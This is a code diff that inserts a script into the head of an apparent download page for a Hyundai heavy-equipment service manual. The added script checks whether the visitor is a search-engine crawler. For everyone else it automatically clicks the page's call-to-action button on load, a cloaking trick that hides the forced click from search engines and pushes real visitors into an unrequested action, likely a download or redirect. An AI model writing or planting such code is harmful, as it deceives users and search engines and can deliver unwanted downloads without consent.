@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hyundai CERES Heavy Equipment Service Manual 07.2023</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Hyundai CERES Heavy Equipment Service Manual 07.2023. Detailed maintenance and troubleshooting info for all regions in English.">
     <meta name="keywords" content="Hyundai CERES Heavy Equipment Service Manual, Hyundai CERES manual 2023, Hyundai CERES service manual pdf, Hyundai CERES manual download, Hyundai CERES equipment manual free download, Hyundai CERES 07.2023 manual, Hyundai CERES excavator manual, Hyundai service manual 2023, Hyundai service manual pdf, Hyundai manual download 2023, Hyundai excavator manual pdf, исправочник Hyundai CERES скачать бесплатно, руководство Hyundai CERES по ремонту, Hyundai сервисный мануал, Hyundai мануал для тяжелого оборудования, Hyundai мануал по обслуживанию, Hyundai CERES оборудование ремонт руководство, Hyundai каталог, особенности оборудования Hyundai CE">
     <style>
